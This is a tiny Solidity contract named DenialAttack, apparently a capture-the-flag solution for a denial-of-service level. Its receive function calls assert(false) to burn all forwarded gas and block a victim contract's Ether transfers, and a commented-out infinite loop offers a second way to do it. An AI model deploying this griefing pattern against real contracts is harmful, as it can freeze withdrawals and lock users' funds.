// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {
    // event jadu(bytes32 _msg);

    receive() external payable {
        // emit jadu("Assetion successful");
        assert(false);

        // while (true) {
        // }
    }
}
